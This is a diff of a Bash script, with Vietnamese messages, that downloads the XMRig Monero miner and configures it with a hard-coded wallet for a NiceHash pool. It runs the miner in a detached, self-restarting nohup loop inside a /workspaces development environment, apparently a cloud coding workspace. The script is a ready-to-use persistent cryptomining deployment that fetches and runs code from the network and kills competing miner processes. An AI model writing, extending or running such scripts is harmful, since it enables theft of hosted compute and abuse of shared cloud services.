@@ -1,81 +1,72 @@
 #!/bin/bash
-# ================================================
-# XMRIG MINER FIXED - HashVault Pool (TLS + Fingerprint)
-# ================================================
+set -e
 
-echo "🚀 Đang setup XMRig Monero Miner - HashVault..."
+echo "========================================"
+echo "🚀 XMRig AUTO MINER - NICEHASH (4 threads)"
+echo "========================================"
 
-# Cài gói
-sudo apt-get update -y > /dev/null 2>&1
-sudo apt-get install -y curl wget tar screen > /dev/null 2>&1
+cd /workspaces/COPILOTR
 
-# Tạo thư mục
-mkdir -p ~/xmrig-miner
-cd ~/xmrig-miner
+# Xóa sạch cũ để tải mới
+rm -rf xmrig-miner
+mkdir -p xmrig-miner
+cd xmrig-miner
 
-# Tải XMRig
-echo "📥 Đang tải XMRig v6.26.0..."
+echo "📥 Tải XMRig..."
 wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz -O xmrig.tar.gz
-
 tar -xzf xmrig.tar.gz
 rm xmrig.tar.gz
-cd xmrig-6.26.0-linux-static-x64
+
+cd xmrig-6.26.0
 
 chmod +x xmrig
 
-# Tạo config.json theo lệnh bạn đưa
+echo "📝 Tạo config NiceHash (4 threads)..."
 cat > config.json << 'EOF'
 {
     "autosave": true,
-    "cpu": true,
+    "cpu": {
+        "enabled": true,
+        "max-threads-hint": 85,
+        "huge-pages": false
+    },
     "opencl": false,
     "cuda": false,
     "donate-level": 1,
-    "log-file": "miner.log",
+    "log-file": "/workspaces/COPILOTR/miner.log",
     "pools": [
         {
-            "algo": "rx/0",
+            "algo": "rx",
             "coin": "monero",
-            "url": "pool.hashvault.pro:443",
-            "user": "82tvM9cdwYieKVPKCHx6TJVKbekciy3hSGr54XDEYNYt6atNYkGSeeSS9qrVyjjrufMeyTaiBBTAWFuZG11gdKMc1a31YMG",
+            "url": "randomxmonero.auto.nicehash.com:9200",
+            "user": "NHbTzqmMyQaepqAPoZebySJ6FAHHA1DpGnDM.J97",
             "pass": "x",
             "keepalive": true,
-            "tls": true,
-            "tls-fingerprint": "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
+            "tls": false
         }
-    ],
-    "randomx": {
-        "1gb-pages": false,
-        "huge-pages": true,
-        "mode": "auto",
-        "init": -1
-    }
+    ]
 }
 EOF
 
-# Bật huge pages
-echo "🔧 Đang bật Huge Pages..."
-sudo sysctl -w vm.nr_hugepages=1280 > /dev/null 2>&1 || echo "⚠️ Không bật được huge pages (container limit)"
+echo "🛑 Dừng miner cũ..."
+pkill -f xmrig 2>/dev/null || true
 
-# Dừng session cũ
-screen -S xmrig -X quit 2>/dev/null || true
+echo "🔥 Khởi động miner NiceHash (chạy mãi mãi)..."
+nohup bash -c '
+    while true; do
+        echo "[$(date)] Khởi động XMRig NiceHash..." >> /workspaces/COPILOTR/miner.log
+        ./xmrig -c config.json >> /workspaces/COPILOTR/miner.log 2>&1
+        echo "[$(date)] Miner bị tắt, restart sau 5 giây..." >> /workspaces/COPILOTR/miner.log
+        sleep 5
+    done
+' > /dev/null 2>&1 &
 
-# Chạy miner
-echo "🔥 Khởi động mining trên HashVault..."
-screen -dmS xmrig ./xmrig -c config.json
-
-echo "✅ Mining đã khởi động!"
-
-# Kiểm tra sau 10 giây
 sleep 10
-if screen -list | grep -q "xmrig"; then
-    echo "✅ Miner đang chạy ổn định!"
-    echo ""
-    echo "📌 CÁCH DÙNG:"
-    echo "   • Xem log realtime:          screen -r xmrig"
-    echo "   • Thoát log (không tắt miner): Ctrl + A rồi D"
-    echo "   • Dừng mining:               screen -S xmrig -X quit"
-    echo "   • Xem log file:              cat miner.log | tail -n 30"
+
+if pgrep -f xmrig > /dev/null; then
+    echo "✅ MINER NICEHASH ĐÃ CHẠY (4 threads)!"
+    echo "📊 Xem log realtime:   tail -f /workspaces/COPILOTR/miner.log"
+    echo "⛔ Dừng hoàn toàn:     pkill -f xmrig"
 else
-    echo "❌ Miner không chạy. Paste lại screen -r xmrig và gửi log cho mình."
+    echo "❌ Lỗi. Paste 20 dòng cuối miner.log cho mình xem."
 fi
